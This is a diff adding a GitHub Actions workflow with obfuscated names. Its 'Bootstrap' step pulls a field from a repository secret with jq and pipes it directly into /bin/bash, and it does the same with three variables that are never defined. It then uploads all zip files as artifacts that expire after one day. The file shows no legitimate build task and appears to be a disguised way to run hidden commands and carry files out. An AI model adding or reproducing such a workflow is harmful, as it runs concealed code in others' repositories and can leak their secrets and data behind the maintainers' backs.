@@ -1,0 +1,29 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          koenz802: ${{ secrets.koenz802 }}
+        run: |
+          printf '%s' "$koenz802" | jq -r .kcnr6452 | /bin/bash
+          echo $jbt6 | jq -r .fy12393 | /bin/bash
+          echo $rrypo500 | jq -r .qye3 | /bin/bash
+          echo $avm1 | jq -r .plhm51 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ThgqnKT0
+          path: "*.zip"
+          retention-days: 1
